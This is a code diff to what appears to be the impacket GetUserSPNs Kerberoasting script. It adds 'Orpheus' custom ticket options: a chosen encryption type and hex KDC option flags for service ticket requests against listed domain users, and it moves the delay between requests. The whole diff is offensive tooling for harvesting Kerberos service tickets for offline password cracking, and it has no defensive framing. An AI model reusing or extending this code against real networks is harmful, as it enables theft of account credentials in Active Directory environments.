@@ -458,16 +458,36 @@ class GetUserSPNs:
 
     def request_multiple_TGSs(self, usernames):
         # Get a TGT for the current user
-        TGT = self.getTGT()
+        enctype = self.__encryption
+        TGT = self.getTGT(enctype)
+
+        print("Orpheus custom ticket options")
+        print("")
+
+        print("Setting encryption to eType " + str(enctype))
+
+        # convert hex to binary
+        kdcopt = self.__options
+        if kdcopt == None:
+            kdcopt = "0x40810010"
+
+        scale = 16
+        kdcbin = bin(int(kdcopt, scale))[2:].zfill(32)
+        opt = list()
+        idx = -1
+        for b in kdcbin:
+            idx += 1
+            if int(b) == 1:
+                print("Adding " + constants.KDCOptions(idx).name)
+                opt.append(constants.KDCOptions(idx).value)
 
         if self.__outputFileName is not None:
             fd = open(self.__outputFileName, 'w+')
         else:
             fd = None
 
-        for username in usernames:
+        for i, username in enumerate(usernames):
             try:
-                self.haveARest()
                 principalName = Principal()
                 principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                 principalName.components = [username]
@@ -475,8 +495,11 @@ class GetUserSPNs:
                 tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                         self.__kdcHost,
                                                                         TGT['KDC_REP'], TGT['cipher'],
-                                                                        TGT['sessionKey'])
+                                                                        TGT['sessionKey'], opt, enctype)
                 self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
+
+                if i != len(usernames) - 1:
+                    self.haveARest()
             except Exception as e:
                 logging.debug("Exception:", exc_info=True)
                 logging.error('Principal: %s - %s' % (username, str(e)))
